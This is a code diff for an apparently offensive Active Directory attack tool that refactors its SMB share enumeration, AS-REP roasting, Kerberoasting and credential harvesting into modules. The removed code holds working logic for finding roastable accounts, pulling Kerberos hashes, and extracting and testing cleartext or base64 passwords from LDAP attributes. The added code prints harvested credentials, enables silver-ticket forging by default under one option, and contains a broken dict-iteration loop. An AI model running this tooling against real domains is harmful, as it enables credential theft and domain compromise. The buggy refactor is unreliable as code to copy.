@@ -25,6 +25,7 @@ from binascii import hexlify
 import datetime, random
 from .modEnumerator.modEnumerator import ModEnumerator
 from .connectors.connectors import Connectors
+from .utils.utils import Utils
 
 # Thanks SecureAuthCorp for GetUserSPNs.py
 # For SPN enum
@@ -64,6 +65,7 @@ class EnumAD():
         # Initialize modules
         self.connectors = Connectors()
         self.enumerator = ModEnumerator()
+        self.utils = Utils()
 
         # Setting lists containing elements we want from the domain controller
         self.computers = []
@@ -125,7 +127,6 @@ class EnumAD():
         if self.enumsmb:
             # Setting variables for further testing and analysis
             self.smbShareCandidates = []
-            self.smbBrowseable = {}
             self.sortComputers()
             self.enumSMB()
 
@@ -256,6 +257,7 @@ class EnumAD():
         
     def enumerate_names(self):
         self.namedServers = self.enumerator.enumerate_server_names(self.computers)
+        # TODO
 
 
     '''
@@ -311,13 +313,6 @@ class EnumAD():
             print('\033[1A\r[ ' + colored('OK', 'green') +' ] Found {0} cpasswords in GPOs on SYSVOL share'.format(len(cpasswords.keys())))
 
 
-    def splitJsonArr(self, arr):
-        if isinstance(arr, list):
-            if len(arr) == 1:
-                return arr[0]
-        return arr
-
-
     def outputToBloodhoundJson(self):
         print('[ ' + colored('OK', 'green') +' ] Generating BloodHound output - this may take time...')
         try:
@@ -363,157 +358,57 @@ class EnumAD():
 
 
     def enumSMB(self):
-        progBar = ProgressBar(widgets=['SMBConnection test: ', Percentage(), Bar(), ETA()], maxval=len(self.smbShareCandidates)).start()
-        prog = 0
-        try:
-            for dnsname in self.smbShareCandidates:
-                try:
-                    # Changing default timeout as shares should respond withing 5 seconds if there is a share
-                    # and ACLs make it available to self.user with self.passwd
-                    smbconn = self.connectors.smb_connector(self.server, self.domuser, self.passwd)
-                    dirs = smbconn.listShares()
-                    self.smbBrowseable[str(dnsname)] = {}
-                    for share in dirs:
-                        self.smbBrowseable[str(dnsname)][str(share['shi1_netname']).rstrip('\0')] = ''
-                        try:
-                            _ = smbconn.listPath(str(share['shi1_netname']).rstrip('\0'), '*')
-                            self.smbBrowseable[str(dnsname)][str(share['shi1_netname']).rstrip('\0')] = True
-                        except (SessionError, UnicodeEncodeError, NetBIOSError):
-                            # Didnt have permission, all good
-                            # Im second guessing the below adding to the JSON file as we're only interested in the listable directories really
-                            #self.smbBrowseable[str(dnsname)][str(share['shi1_netname']).rstrip('\0')] = False
-                            continue
-                    smbconn.logoff()
-                    progBar.update(prog + 1)
-                    prog += 1
-                except (socket.error, NetBIOSTimeout, SessionError, NetBIOSError):
-                    # TODO: Examine why we sometimes get:
-                    # impacket.smbconnection.SessionError: SMB SessionError: STATUS_PIPE_NOT_AVAILABLE
-                    # on healthy shares. It seems to be reported with CIF shares 
-                    progBar.update(prog + 1)
-                    prog += 1
-                    continue
-        except ValueError:
-            # We reached end of progressbar, continue since we finish below
-            pass
-        progBar.finish()
-        print('')
+        smbBrowseable = self.enumerator.enumSMB(self.connectors, self.smbShareCandidates, self.server, self.domuser, self.passwd)
 
         availDirs = []
-        for key, value in self.smbBrowseable.items():
+        for key, value in smbBrowseable.items():
             for _, v in value.items():
                 if v:
                     availDirs.append(key)
 
         if len(self.smbShareCandidates) == 1:
-            print('[ ' + colored('OK', 'green') + ' ] Searched {0} share and {1} share with {2} subdirectories/files is browseable by {3}'.format(len(self.smbShareCandidates), len(self.smbBrowseable.keys()), len(availDirs), self.domuser))
+            print('[ ' + colored('OK', 'green') + ' ] Searched {0} share and {1} share with {2} subdirectories/files is browseable by {3}'.format(len(self.smbShareCandidates), len(smbBrowseable.keys()), len(availDirs), self.domuser))
         else:
-            print('[ ' + colored('OK', 'green') + ' ] Searched {0} shares and {1} shares with {2} subdirectories/file sare browseable by {3}'.format(len(self.smbShareCandidates), len(self.smbBrowseable.keys()), len(availDirs), self.domuser))
-        if len(self.smbBrowseable.keys()) > 0:
-            with open('{0}-open-smb.json'.format(self.server), 'w') as f:
-                json.dump(self.smbBrowseable, f, indent=4, sort_keys=False)
-            print('[ ' + colored('OK', 'green') + ' ] Wrote browseable shares to {0}-open-smb.json'.format(self.server))
-
+            print('[ ' + colored('OK', 'green') + ' ] Searched {0} shares and {1} shares with {2} subdirectories/file are browseable by {3}'.format(len(self.smbShareCandidates), len(smbBrowseable.keys()), len(availDirs), self.domuser))
+        if len(smbBrowseable.keys()) > 0:
+            self.utils.WriteFiles(self.output, smbBrowseable, 'open-smb.json')
 
 
     def write_file(self):
-        with open(str(self.output) + '-computers', 'w') as f:
-            for item in self.computers:
-                f.write(str(item))
-                f.write("\n")
-        with open(str(self.output) + '-people', 'w') as f:
-            for item in self.people:
-                f.write(str(item))
-                f.write("\n")
-        with open(str(self.output) + '-groups', 'w') as f:
-            for item in self.groups:
-                f.write(str(item))
-                f.write("\n")
-        with open(str(self.output) + '-spn', 'w') as f:
-            for item in self.spn:
-                f.write(str(item))
-                f.write("\n")
-        with open(str(self.output) + '-acl', 'w') as f:
-            for item in self.acl:
-                f.write(str(item))
-                f.write("\n")
-        with open(str(self.output) + '-gpo', 'w') as f:
-            for item in self.gpo:
-                f.write(str(item))
-                f.write("\n")
-        with open(str(self.output) + '-domains', 'w') as f:
-            for item in self.domains:
-                f.write(str(item))
-                f.write("\n")
-        with open(str(self.output) + '-ous', 'w') as f:
-            for item in self.ous:
-                f.write(str(item))
-                f.write("\n")
-
-        print('[ ' + colored('OK', 'green') +' ] Wrote all files to {0}-obj_name'.format(self.output))
-
+        files_to_write = {
+            "users": self.people,
+            "computers": self.computers,
+            "groups": self.groups,
+            "spn": self.spn,
+            "acl": self.acl,
+            "gpo": self.gpo,
+            "domains": self.domains,
+            "ous": self.ous,
+            "deletedUsers": self.deletedUsers
+        }
+        for name, collection in files_to_write.items():
+            self.utils.WriteFiles(self.output, collection,name)
+                
 
     def enumKerbPre(self):
-        from .attacks.asreproast import asreproast
-        roaster = asreproast.AsRepRoast()
-        # Build user array
-        users = []
-        self.conn.search(self.dc_string[:-1], '(&(samaccounttype=805306368)(userAccountControl:1.2.840.113556.1.4.803:=4194304))', attributes=self.ldapProps, search_scope=SUBTREE)
-        for entry in self.conn.entries:
-            users.append(str(entry['sAMAccountName']) + '@{0}'.format(self.server))
-        if len(users) == 0:
-            print('[ ' + colored('OK', 'green') +' ] Found {0} accounts that does not require Kerberos preauthentication'.format(len(users)))
-        elif len(users) == 1:
-            print('[ ' + colored('OK', 'yellow') +' ] Found {0} account that does not require Kerberos preauthentication'.format(len(users)))
-        else:
-            print('[ ' + colored('OK', 'yellow') +' ] Found {0} accounts that does not require Kerberos preauthentication'.format(len(users)))
-    
-        hashes = []
-        # Build request for Tickets
-        for usr in users:
-            userHash = roaster.RepRoast(self.server, usr)
-            if userHash:
-                hashes = hashes + userHash
+        hashes = self.enumerator.enumASREPRoast(self.conn, self.server, self.dc_string[:-1])
 
         if len(hashes) > 0:
-            with open('{0}-jtr-hashes'.format(self.server), 'w') as f:
-                for h in hashes:
-                    f.write(str(h) + '\n')
-
+            self.utils.WriteFiles(self.output, hashes, 'ASREPHashes')
             print('[ ' + colored('OK', 'yellow') +' ] Wrote all hashes to {0}-jtr-hashes'.format(self.server))
         else:
             print('[ ' + colored('OK', 'green') +' ] Got 0 hashes')
 
 
     def enumSPNUsers(self):
-        from .attacks.kerberoast import kerberoast
-        kerberoaster = kerberoast.Kerberoast()
-
-        users_spn = {}
-        user_tickets = {}
-
-        userDomain = self.domuser.split('@')[1]
-
-        idx = 0
-        for entry in self.spn:
-            spns = json.loads(self.spn[idx].entry_to_json())
-            users_spn[self.splitJsonArr(spns['attributes'].get('name'))] = self.splitJsonArr(spns['attributes'].get('servicePrincipalName')) 
-            idx += 1    
-        for user, spn in users_spn.items():
-            if isinstance(spn, list):
-                # We only really need one to get a ticket
-                spn = spn[0]
-            else:
-                tickets = kerberoaster.roast(self.domuser, self.passwd, userDomain, user, spn)
-                if tickets:
-                    user_tickets = { **user_tickets, **tickets }
+        user_tickets = self.enumerator.enumKerberoast(self.spn, self.domuser, self.passwd)
 
         if len(user_tickets.keys()) > 0:
-            with open('{0}-spn-tickets'.format(self.server), 'w') as f:
-                for key, value in user_tickets.items():
-                    if self.silvertgt:
-                        self.silverTicket(value.split('$')[-2])
-                    f.write('{0}:{1}\n'.format(key, value))
+            if self.silvertgt:
+                for _, value in user_tickets:
+                    self.silverTicket(value.split('$')[-2])
+            self.utils.WriteFiles(self.output, user_tickets, 'spn-tickets')
+
             if len(user_tickets.keys()) == 1:
                 print('[ ' + colored('OK', 'yellow') +' ] Got and wrote {0} ticket for Kerberoasting. Run: john --format=krb5tgs --wordlist=<list> {1}-spn-tickets'.format(len(user_tickets.keys()), self.server))
             else:
@@ -537,107 +432,14 @@ class EnumAD():
         
 
     def enumForCreds(self, ldapdump):
-        searchTerms = [
-                'legacy', 'pass', 'password', 'pwd', 'passcode'
-        ]
-        excludeTerms = [
-                'badPasswordTime', 'badPwdCount', 'pwdLastSet', 'legacyExchangeDN'
-        ]
-        possiblePass = {}
-        idx = 0
-        for _ in ldapdump:
-            user = json.loads(ldapdump[idx].entry_to_json())
-            for prop, value in user['attributes'].items():
-                if any(term in prop.lower() for term in searchTerms) and not any(ex in prop for ex in excludeTerms):
-                    try:
-                        possiblePass[user['attributes']['userPrincipalName'][0]] = value[0]
-                    except KeyError:
-                        # Could be a service user instead
-                        try:
-                            possiblePass[user['attributes']['servicePrincipalName'][0]] = value[0]
-                        except KeyError:
-                            # Don't know which type
-                            continue
-
-            idx += 1
-        if len(possiblePass) > 0:
-            print('[ ' + colored('INFO', 'green') +' ] Found possible password in properties - attempting to determine if it is a password')
-
-            for user, password in possiblePass.items():
-                try:
-                    usr, passwd = self.entroPass(user, password)
-                except TypeError:
-                    # None returned, just continue
-                    continue
-            if not self.CREDS:
-                self.domuser = usr
-                self.passwd = passwd
-                self.passwords[usr] = passwd
-                self.runWithCreds()
-                return
-
-
-    def entroPass(self, user, password):
-        test_conn = None
-        if not password:
-            return None
-        # First check if it is a clear text
-        try:
-            test_conn = self.connectors.ldap_connector(self.server, True, user, password)
-        except (LDAPBindError, LDAPSocketOpenError, LDAPSocketSendError):
-            try:
-                test_conn = self.connectors.ldap_connector(self.server, False, user, password)
-            except (LDAPBindError, LDAPSocketOpenError, LDAPSocketSendError):
-                pass
-        if test_conn:
-            # Validate the login (bind) request
-            if int(test_conn.result['result']) != 0:
-                if self.CREDS:
-                    print('[ ' + colored('INFO', 'yellow') +' ] User: "{0}" with: "{1}" as possible clear text password'.format(user, password))
-                else:
-                    print('[ ' + colored('INFO', 'green') +' ] User: "{0}" with: "{1}" was not cleartext'.format(user, password))
-            else:
-                if self.CREDS:
-                    print('[ ' + colored('INFO', 'yellow') +' ] User: "{0}" had cleartext password of: "{1}" in a property'.format(user, password))
-                else:
-                    print('[ ' + colored('OK', 'yellow') +' ] User: "{0}" had cleartext password of: "{1}" in a property - continuing with these creds'.format(user, password))
-                    print('')
-                    return user, password
-            test_conn.unbind()
-            test_conn = None
-
-        # Attempt for base64
-        # Could be base64, lets try
-        try:
-            pw = base64.b64decode(bytes(password, encoding='utf-8')).decode('utf-8')
-        except base64.binascii.Error:
-            return None
-    
-        # Attempt decoded PW
-        try:
-            test_conn = self.connectors.ldap_connector(self.server, True, user, pw)
-        except (LDAPBindError, LDAPSocketOpenError, LDAPSocketSendError):
-            try:
-                test_conn = self.connectors.ldap_connector(self.server, False, user, pw)
-            except (LDAPBindError, LDAPSocketOpenError, LDAPSocketSendError):
-                pass
-        if test_conn:
-            # Validate the login (bind) request
-            if int(test_conn.result['result']) != 0:
-                test_conn.unbind()
-                if self.CREDS:
-                    print('[ ' + colored('INFO', 'yellow') +' ] User: "{0}" with: "{1}" as possible base64 decoded password'.format(user, pw))
-                else:
-                    print('[ ' + colored('INFO', 'green') +' ] User: "{0}" with: "{1}" was not base64 encoded'.format(user, pw))
-            else:
-                if self.CREDS:
-                    print('[ ' + colored('INFO', 'yellow') +' ] User: "{0}" had base64 encoded password of: "{1}" in a property'.format(user, pw))
-                else:
-                    print('[ ' + colored('OK', 'yellow') +' ] User: "{0}" had base64 encoded password of: "{1}" in a property - continuing with these creds'.format(user, pw))
-                    print('')
-                    return user, pw
-
-
+        advance, self.passwords = self.enumerator.enumForCreds(self.CREDS, self.passwords, ldapdump, self.connectors, self.server)
+        
+        if advance:
+            self.domuser = str(list(self.passwords.keys())[0])
+            self.passwd = str(self.passwords[self.domuser])
+            print(self.domuser, self.passwd)
+            self.runWithCreds()
+            return
 
 
 def main(args):
@@ -718,6 +520,7 @@ def main(args):
         args.spn = True
         args.exploits = True
         args.sysvol = True
+        args.silvertgt = True
     if args.no_creds:
         args.user = False
     else:
@@ -732,7 +535,7 @@ def main(args):
     if args.out_file:
         file_to_write = args.out_file
 
-    enumAD = EnumAD(args.dc, args.secure, file_to_write, args.smb, args.bloodhound, args.kerberos_preauth, args.spn, args.sysvol, args.dry_run, args.exploits, args.silvertgt, args.user)
+    EnumAD(args.dc, args.secure, file_to_write, args.smb, args.bloodhound, args.kerberos_preauth, args.spn, args.sysvol, args.dry_run, args.exploits, args.silvertgt, args.user)
 
     # Just print a blank line for output sake
     print('')
